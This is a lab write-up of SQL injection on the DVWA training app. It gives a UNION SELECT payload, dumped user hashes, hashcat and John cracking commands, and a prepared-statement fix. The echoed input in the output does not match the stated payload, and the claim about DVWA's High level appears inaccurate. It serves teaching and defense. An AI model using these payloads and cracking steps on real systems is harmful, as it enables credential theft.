# SQL Injection — DVWA

First vulnerability in the OWASP Top 10 list for this task. Tested on DVWA (Damn Vulnerable Web App) running locally on Kali, security level set to **Low** so the raw behavior is visible before looking at how it gets fixed.

SQL Injection happens when user input gets concatenated directly into a SQL query instead of being treated as data. If the input isn't sanitized or parameterized, an attacker can break out of the intended query structure and write their own SQL.

---

## 1. Finding the injection point

DVWA's SQL Injection page takes a `User ID` and is supposed to return that one user's first name and surname. Normal use looks like entering `1` and getting back a single record.

The first thing to test is whether the input is actually being treated as a number/string safely, or just glued into the query. A single quote is usually the first thing to try:

```
'
```

If that throws a MySQL syntax error back at you, that's confirmation the input is landing straight inside the query unescaped.

---

## 2. The payload

```sql
1' UNION SELECT user, password FROM users-- -
```

Entered directly into the User ID field.

**Why this works:** the backend query is something like:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id'
```

Substituting the payload in turns it into:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT user, password FROM users-- -'
```

- `UNION SELECT` appends a second, attacker-controlled query to the original one, as long as the column count matches.
- `user, password` pulls two columns from the `users` table straight into the same output slots the page normally uses for first name / surname.
- `-- -` comments out whatever trailing syntax (the closing quote) came after the injected code, so the query still runs cleanly.

---

## 3. Result

Screenshot from the actual test run:

![SQL Injection - UNION SELECT dumping usernames and password hashes](./screenshots/sql-injection-union.png)

Output returned:

```
ID: ' OR '1'='1
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

The page thinks it's printing "first name" and "surname" — it's actually printing every username and password hash in the `users` table. One injection point, entire user table dumped.

Note `admin` and `smithy` share the same hash (`5f4dcc...`) — same password reused across two accounts, which is its own separate finding.

---

## 4. Cracking the extracted hashes

These are unsalted MD5 hashes, which are trivial to crack against a wordlist:

```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashcat -m 0 -a 0 - /usr/share/wordlists/rockyou.txt
```

or with John:

```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Cracked values from this dataset (these are DVWA's well-known default creds, useful for reference):

| Username | Hash | Cracked Password |
|---|---|---|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

Went from a single text field on a webpage to full admin credentials, no authentication bypass tricks needed — just an unsanitized query.

---

## 5. Why this is possible (Low security source)

DVWA's low-security SQLi page builds the query like this:

```php
$id = $_REQUEST['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
```

The user's input goes directly into the query string with basic string concatenation. Nothing stops `$id` from containing additional SQL syntax.

---

## 6. Fix — Prepared Statements

The actual fix isn't "block quote characters" or "filter bad words" — it's separating the query structure from the data entirely, so user input can never be interpreted as SQL syntax regardless of what characters it contains.

**Vulnerable version:**
```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($conn, $query);
```

**Fixed version using prepared statements (mysqli):**
```php
$stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->bind_param("s", $id);
$stmt->execute();
$result = $stmt->get_result();
```

Or the same idea with PDO:
```php
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = :id");
$stmt->bindParam(':id', $id);
$stmt->execute();
```

**Why this actually fixes it:** the query structure (`SELECT ... WHERE user_id = ?`) is sent to the database first and compiled on its own. The value of `$id` is sent separately afterward and is only ever treated as a literal value being slotted in — never as part of the SQL syntax. Even if `$id` contains `' UNION SELECT user, password FROM users-- -`, the database treats that whole string as a single value it's searching for, not as a command to run.

---

## 7. Confirming the fix

Set DVWA's security level to **High** (this switches the backend to a prepared-statement version of the same page) and re-run the exact same payload:

```
1' UNION SELECT user, password FROM users-- -
```

Result: no output, or a "no matching record" style response — the injected SQL is treated as a literal string being searched for in `user_id`, which obviously doesn't match anything. Same input, same field, completely different outcome once the query is parameterized.

---

## Key Takeaways

- SQLi happens when user input is concatenated into a query string instead of passed as a parameter.
- `UNION SELECT` is one of the most direct ways to pull data from a different table than the one the page intended to query — it just requires matching the column count.
- Password hashes alone aren't a safe fallback — unsalted MD5 (like DVWA uses here) can be cracked in seconds with a common wordlist.
- The fix is architectural, not cosmetic: prepared statements/parameterized queries, not input blacklisting, escaping tricks, or "just remove quotes."
